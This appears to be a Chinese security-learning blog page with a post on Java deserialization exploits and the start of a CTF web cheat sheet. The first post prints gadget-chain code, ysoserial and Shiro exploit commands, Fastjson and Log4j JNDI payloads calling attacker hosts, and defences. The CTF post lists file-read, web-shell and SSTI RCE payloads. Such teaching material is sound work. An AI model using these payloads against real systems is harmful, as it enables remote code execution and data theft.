+    <link itemprop="mainEntityOfPage" href="https://lvyatan.github.io/2026/09/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://avatars.githubusercontent.com/lvyatan">
+      <meta itemprop="name" content="lvyatan">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="网安学习笔记">
+      <meta itemprop="description" content="个人网络安全学习博客，记录渗透测试、漏洞挖掘、安全工具开发等技术笔记">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | 网安学习笔记">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/09/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2/" class="post-title-link" itemprop="url">Java 反序列化漏洞初探</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-09-20 13:00:00" itemprop="dateCreated datePublished" datetime="2026-09-20T13:00:00+08:00">2026-09-20</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-09-01 18:10:20" itemprop="dateModified" datetime="2026-09-01T18:10:20+08:00">2026-09-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Web-%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">Web 渗透</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>971</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>4 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Java 反序列化漏洞从 Apache Commons Collections 系列爆出后，几乎每年都有大瓜。Fastjson、Shiro、Log4j2 都被它折磨过。本文梳理原理、利用面与防御。仅用于合法授权环境。</p>
+<h2 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h2><h3 id="1-Java-序列化"><a href="#1-Java-序列化" class="headerlink" title="1. Java 序列化"></a>1. Java 序列化</h3><p>把对象转成字节流：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;obj.ser&quot;</span>));</span><br><span class="line">oos.writeObject(<span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;123456&quot;</span>));</span><br></pre></td></tr></table></figure>
+
+<p>字节流含：</p>
+<ul>
+<li>类的全限定名</li>
+<li>字段名 + 类型 + 值</li>
+<li>类的 serialVersionUID</li>
+<li>父类信息</li>
+</ul>
+<h3 id="2-反序列化"><a href="#2-反序列化" class="headerlink" title="2. 反序列化"></a>2. 反序列化</h3><p>把字节流还原成对象：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;obj.ser&quot;</span>));</span><br><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User) ois.readObject();</span><br></pre></td></tr></table></figure>
+
+<p>漏洞关键：<strong>反序列化时会调用对象的 <code>readObject</code> &#x2F; <code>readResolve</code> &#x2F; <code>readExternal</code> 等方法</strong>。如果这些方法里有危险操作，构造特殊字节流即可触发。</p>
+<h3 id="3-漏洞核心：Gadget-Chain"><a href="#3-漏洞核心：Gadget-Chain" class="headerlink" title="3. 漏洞核心：Gadget Chain"></a>3. 漏洞核心：Gadget Chain</h3><p>反序列化利用链由多个类协作形成，每个类被叫做一个 Gadget。经典模板：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">入口类（HashSet、HashMap、PriorityQueue）</span><br><span class="line">   ↘ 触发反序列化时调用某个方法</span><br><span class="line">中间类（AnnotationInvocationHandler）</span><br><span class="line">   ↖ 调用 transform()</span><br><span class="line">危险类（InvokerTransformer / TemplatesImpl）</span><br><span class="line">   → 执行命令 / 加载字节码</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02-经典-CommonsCollections-链"><a href="#0x02-经典-CommonsCollections-链" class="headerlink" title="0x02 经典 CommonsCollections 链"></a>0x02 经典 CommonsCollections 链</h2><h3 id="CC1（Lazymap）"><a href="#CC1（Lazymap）" class="headerlink" title="CC1（Lazymap）"></a>CC1（Lazymap）</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Transformer</span>[] <span class="variable">transformers</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, chain);</span><br><span class="line">lazyMap.get(<span class="string">&quot;anything&quot;</span>);  <span class="comment">// 触发</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="CC6（绕过-CC1-修复）"><a href="#CC6（绕过-CC1-修复）" class="headerlink" title="CC6（绕过 CC1 修复）"></a>CC6（绕过 CC1 修复）</h3><p>不同链路，但效果一致。CC6 是当前利用率最高的链。</p>
+<h3 id="CC2-CC4"><a href="#CC2-CC4" class="headerlink" title="CC2 &#x2F; CC4"></a>CC2 &#x2F; CC4</h3><p>基于 <code>PriorityQueue</code> + <code>TransformingComparator</code>，需要 <code>commons-collections4</code>。</p>
+<h2 id="0x03-实战利用"><a href="#0x03-实战利用" class="headerlink" title="0x03 实战利用"></a>0x03 实战利用</h2><h3 id="1-ysoserial-一键生成"><a href="#1-ysoserial-一键生成" class="headerlink" title="1. ysoserial 一键生成"></a>1. ysoserial 一键生成</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections6 <span class="string">&quot;calc.exe&quot;</span> &gt; payload.bin</span><br><span class="line">java -jar ysoserial.jar CommonsCollections1 <span class="string">&quot;bash -c &#123;echo,...&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> &gt; payload.bin</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-投递方式"><a href="#2-投递方式" class="headerlink" title="2. 投递方式"></a>2. 投递方式</h3><p>把 payload 字节流塞进任何反序列化点：</p>
+<ul>
+<li><strong>HTTP Cookie</strong>：很多框架把 session 序列化</li>
+<li><strong>RMI&#x2F;JMX</strong>：直接发到 1099 端口</li>
+<li><strong>JNDI 注入</strong>：LDAP &#x2F; RMI 服务</li>
+<li><strong>HTTP 报文体</strong>：POST body</li>
+<li><strong>自定义协议</strong>：比如 Java WebService 的 SOAP</li>
+</ul>
+<h3 id="3-检测反序列化点"><a href="#3-检测反序列化点" class="headerlink" title="3. 检测反序列化点"></a>3. 检测反序列化点</h3><p>字节流以 <code>AC ED 00 05</code>（java serialization stream magic）开头，base64 后以 <code>rO0AB</code> 开头。BurpSuite 加正则匹配：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\xac\xed\x00\x05</span><br><span class="line">rO0AB[A-Za-z0-9+/]+</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x04-其他常见组件链"><a href="#0x04-其他常见组件链" class="headerlink" title="0x04 其他常见组件链"></a>0x04 其他常见组件链</h2><h3 id="1-Shiro"><a href="#1-Shiro" class="headerlink" title="1. Shiro"></a>1. Shiro</h3><p>记住 Shiro 默认密钥 <code>kPH+bIxk5D2deZiIxcaaaA==</code>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 用 ysoserial 生成 payload</span></span><br><span class="line">java -jar ysoserial.jar CommonsCollections6 <span class="string">&quot;open -a Calculator&quot;</span> &gt; payload.<span class="built_in">bin</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># AES 加密 + base64 + Cookie 头</span></span><br><span class="line">python shiro_exploit.py --target http://target.com \</span><br><span class="line">  --key kPH+bIxk5D2deZiIxcaaaA== \</span><br><span class="line">  --payload-file payload.<span class="built_in">bin</span> \</span><br><span class="line">  --header Cookie:rememberMe=...</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-Fastjson"><a href="#2-Fastjson" class="headerlink" title="2. Fastjson"></a>2. Fastjson</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span><span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://1.2.3.4/Exploit&quot;</span><span class="punctuation">,</span><span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>1.2.24 修复后陆续有 <code>1.2.47</code>、<code>1.2.68</code> 的绕过，每个版本都修一遍。</p>
+<h3 id="3-Log4j2（CVE-2021-44228）"><a href="#3-Log4j2（CVE-2021-44228）" class="headerlink" title="3. Log4j2（CVE-2021-44228）"></a>3. Log4j2（CVE-2021-44228）</h3><p>不是序列化，但 JNDI 注入路径相同：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://1.2.3.4/Exploit&#125;</span><br></pre></td></tr></table></figure>
+
+<p>服务端打 LDAP &#x2F; RMI 加载恶意类。</p>
+<h3 id="4-Spring-Cloud-Function-Spring4Shell"><a href="#4-Spring-Cloud-Function-Spring4Shell" class="headerlink" title="4. Spring Cloud Function &#x2F; Spring4Shell"></a>4. Spring Cloud Function &#x2F; Spring4Shell</h3><p>特定路由上的 SpEL &#x2F; OGNL 注入引发 RCE。</p>
+<h2 id="0x05-JNDI-注入利用"><a href="#0x05-JNDI-注入利用" class="headerlink" title="0x05 JNDI 注入利用"></a>0x05 JNDI 注入利用</h2><p>JNDI 是反序列化漏洞最常见的”出口”。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">受害机</span><br><span class="line">   ↓</span><br><span class="line">   调用 InitialContext.lookup(&quot;ldap://attacker.com/Exploit&quot;)</span><br><span class="line">   ↓</span><br><span class="line">攻击者 LDAP / RMI</span><br><span class="line">   ↓</span><br><span class="line">   返回恶意 JNDI Reference，触发 Codebase 加载</span><br><span class="line">   ↓</span><br><span class="line">受害机</span><br><span class="line">   ↓</span><br><span class="line">   加载 http://attacker.com/Exploit.class</span><br><span class="line">   ↓</span><br><span class="line">   执行 static &#123; Runtime.getRuntime().exec(...) &#125;</span><br></pre></td></tr></table></figure>
+
+<p>绕过 JDK 高版本 trust 限制：</p>
+<ul>
+<li><strong>本地 Gadget</strong>（Tomcat EL 表达式链）</li>
+<li><strong>RMI 序列化</strong></li>
+<li><strong>LDAP Reference</strong>（高版本被禁用远程 classloader）</li>
+</ul>
+<h2 id="0x06-防御"><a href="#0x06-防御" class="headerlink" title="0x06 防御"></a>0x06 防御</h2><h3 id="1-升级组件"><a href="#1-升级组件" class="headerlink" title="1. 升级组件"></a>1. 升级组件</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 老版本 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 升级到 3.2.2+ / 4.x，添加 InvokerTransformer 反序列化检查 --&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-白名单"><a href="#2-白名单" class="headerlink" title="2. 白名单"></a>2. 白名单</h3><p>重写 <code>ObjectInputStream</code>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SafeObjectInputStream</span> <span class="keyword">extends</span> <span class="title class_">ObjectInputStream</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Set</span>&lt;String&gt; <span class="variable">ALLOW</span> <span class="operator">=</span> Set.of(</span><br><span class="line">        <span class="string">&quot;java.lang.String&quot;</span>, <span class="string">&quot;java.lang.Number&quot;</span>, <span class="string">&quot;java.util.ArrayList&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="type">Class</span>&lt;?&gt; <span class="title function_">resolveClass</span><span class="params">(ObjectStreamClass desc)</span></span><br><span class="line">            <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">if</span> (!ALLOW.contains(desc.getName())) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">&quot;Unauthorized class&quot;</span>, desc.getName());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(desc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-关闭危险特性"><a href="#3-关闭危险特性" class="headerlink" title="3. 关闭危险特性"></a>3. 关闭危险特性</h3><ul>
+<li>Shiro 改默认密钥</li>
+<li>Fastjson <code>safeMode=true</code></li>
+<li>RMI 启用 SSL + 客户端校验</li>
+<li>禁用 JNDI 远程类加载：<code>com.sun.jndi.ldap.object.trustURLCodebase=false</code></li>
+</ul>
+<h3 id="4-监控"><a href="#4-监控" class="headerlink" title="4. 监控"></a>4. 监控</h3><ul>
+<li>RASP 监控 <code>Runtime.exec</code> &#x2F; <code>ProcessBuilder.start</code></li>
+<li>字节流 magic number 检测</li>
+</ul>
+<h2 id="0x07-工具"><a href="#0x07-工具" class="headerlink" title="0x07 工具"></a>0x07 工具</h2><table>
+<thead>
+<tr>
+<th>工具</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">ysoserial</a></td>
+<td>Payload 生成</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Exploit">JNDI-Injection-Exploit</a></td>
+<td>JNDI 利用</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec">marshalsec</a></td>
+<td>多协议 payload</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://github.com/feihong-cs/ShiroExploit">ShiroExp</a></td>
+<td>Shiro 自动化</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://github.com/hfdzmlshfj/fastjson-vul-tools">fastjson-vul-tools</a></td>
+<td>Fastjson</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://github.com/WhiteHSBG/JNDIExploit">JNDIExploit</a></td>
+<td>综合 JNDI</td>
+</tr>
+</tbody></table>
+<h2 id="0x08-总结"><a href="#0x08-总结" class="headerlink" title="0x08 总结"></a>0x08 总结</h2><p>反序列化漏洞本质是”反序列化过程会调用对象方法”这一设计。所有 Java 反序列化漏洞都能套用入口链 + 中间链 + 危险链的模板。掌握 ysoserial 一键生成 + JNDI 投递两条路，再去看各种新爆出的链会清晰很多。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://lvyatan.github.io/2026/09/12/CTF-Web%E9%A2%98%E5%B8%B8%E8%A7%81%E8%80%83%E7%82%B9/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://avatars.githubusercontent.com/lvyatan">
+      <meta itemprop="name" content="lvyatan">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="网安学习笔记">
+      <meta itemprop="description" content="个人网络安全学习博客，记录渗透测试、漏洞挖掘、安全工具开发等技术笔记">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | 网安学习笔记">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/09/12/CTF-Web%E9%A2%98%E5%B8%B8%E8%A7%81%E8%80%83%E7%82%B9/" class="post-title-link" itemprop="url">CTF Web 题常见考点总结</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-09-12 16:00:00" itemprop="dateCreated datePublished" datetime="2026-09-12T16:00:00+08:00">2026-09-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-09-01 18:09:38" itemprop="dateModified" datetime="2026-09-01T18:09:38+08:00">2026-09-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>852</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>3 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>CTF Web 是 Web 安全入门最高效的训练场。本文梳理国内&#x2F;国际赛高频考点与对应工具，做刷题索引。</p>
+<h2 id="0x01-考点地图"><a href="#0x01-考点地图" class="headerlink" title="0x01 考点地图"></a>0x01 考点地图</h2><table>
+<thead>
+<tr>
+<th>类别</th>
+<th>子方向</th>
+<th>难度</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>注入</td>
+<td>SQL &#x2F; NoSQL &#x2F; LDAP &#x2F; SSTI &#x2F; XSS</td>
+<td>⭐ ~ ⭐⭐⭐⭐</td>
+</tr>
+<tr>
+<td>序列化</td>
+<td>PHP 反序列化 &#x2F; Java 反序列化 &#x2F; pickle</td>
+<td>⭐⭐⭐</td>
+</tr>
+<tr>
+<td>文件操作</td>
+<td>上传 &#x2F; 读取 &#x2F; 包含</td>
+<td>⭐⭐</td>
+</tr>
+<tr>
+<td>命令执行</td>
+<td>RCE &#x2F; 命令注入 &#x2F; 沙箱逃逸</td>
+<td>⭐⭐⭐</td>
+</tr>
+<tr>
+<td>弱类型</td>
+<td>PHP 类型混淆 &#x2F; JS &#x3D;&#x3D;</td>
+<td>⭐</td>
+</tr>
+<tr>
+<td>逻辑</td>
+<td>越权 &#x2F; 业务漏洞</td>
+<td>⭐⭐</td>
+</tr>
+<tr>
+<td>协议</td>
+<td>HTTP Smuggling &#x2F; JWT &#x2F; OAuth</td>
+<td>⭐⭐⭐</td>
+</tr>
+<tr>
+<td>框架</td>
+<td>Spring &#x2F; Django &#x2F; Flask &#x2F; ThinkPHP</td>
+<td>⭐⭐⭐⭐</td>
+</tr>
+</tbody></table>
+<h2 id="0x02-高频考点速查"><a href="#0x02-高频考点速查" class="headerlink" title="0x02 高频考点速查"></a>0x02 高频考点速查</h2><h3 id="1-PHP-弱类型"><a href="#1-PHP-弱类型" class="headerlink" title="1. PHP 弱类型"></a>1. PHP 弱类型</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;0e123456&quot;</span> == <span class="string">&quot;0e234567&quot;</span>     <span class="comment">// true，科学计数法 0</span></span><br><span class="line"><span class="string">&quot;0&quot;</span> == <span class="string">&quot;abc&quot;</span>                  <span class="comment">// true</span></span><br><span class="line"><span class="title function_ invoke__">md5</span>(<span class="string">&quot;240610708&quot;</span>) == <span class="title function_ invoke__">md5</span>(<span class="string">&quot;QNKCDZO&quot;</span>)  <span class="comment">// true，0e 开头</span></span><br><span class="line"><span class="title function_ invoke__">in_array</span>(<span class="string">&quot;1abc&quot;</span>, [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>])     <span class="comment">// true，默认弱比较</span></span><br><span class="line"><span class="title function_ invoke__">strcmp</span>([<span class="number">1</span>], <span class="string">&quot;1&quot;</span>)              <span class="comment">// null，== 0</span></span><br></pre></td></tr></table></figure>
+
+<p>绕过姿势：找 <code>==</code> 而非 <code>===</code>，找 <code>0e</code> 开头 hash。</p>
+<h3 id="2-伪协议"><a href="#2-伪协议" class="headerlink" title="2. 伪协议"></a>2. 伪协议</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>)      <span class="comment">// 读 POST 原始 body</span></span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;data://text/plain,&lt;?php phpinfo();&quot;</span>)  <span class="comment">// 内联</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=index.php&quot;</span>  <span class="comment">// 读源码</span></span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://filter/convert.base64-decode/resource=shell.php&quot;</span>)  <span class="comment">// 触发</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-SSTI（服务端模板注入）"><a href="#3-SSTI（服务端模板注入）" class="headerlink" title="3. SSTI（服务端模板注入）"></a>3. SSTI（服务端模板注入）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7*7&#125;&#125;       → 49</span><br><span class="line">&#123;&#123;7*&#x27;7&#x27;&#125;&#125;     → 7777777（Jinja2）/ 49（Twig）/ Error（Freemarker）</span><br><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;system&quot;)&#125;&#125;&#123;&#123;_self.env.getUndefinedFilter(&quot;id&quot;)&#125;&#125;  // Twig RCE</span><br><span class="line">$&#123;7*7&#125;        → 49（Freemarker / Velocity）</span><br></pre></td></tr></table></figure>
+
+<p>测试 payload：<code>&#123;&#123;config&#125;&#125;</code> <code>&#123;&#123;request&#125;&#125;</code> <code>__class__</code> <code>__mro__</code> 等。</p>
+<h3 id="4-文件读取-包含"><a href="#4-文件读取-包含" class="headerlink" title="4. 文件读取 &#x2F; 包含"></a>4. 文件读取 &#x2F; 包含</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?file=/etc/passwd</span><br><span class="line">?file=php://filter/convert.base64-encode/resource=config.php</span><br><span class="line">?file=data://text/plain,&lt;?php system($_GET[1]);?&gt;</span><br><span class="line">?file=zip://uploads/shell.jpg%23shell.php</span><br></pre></td></tr></table></figure>
+
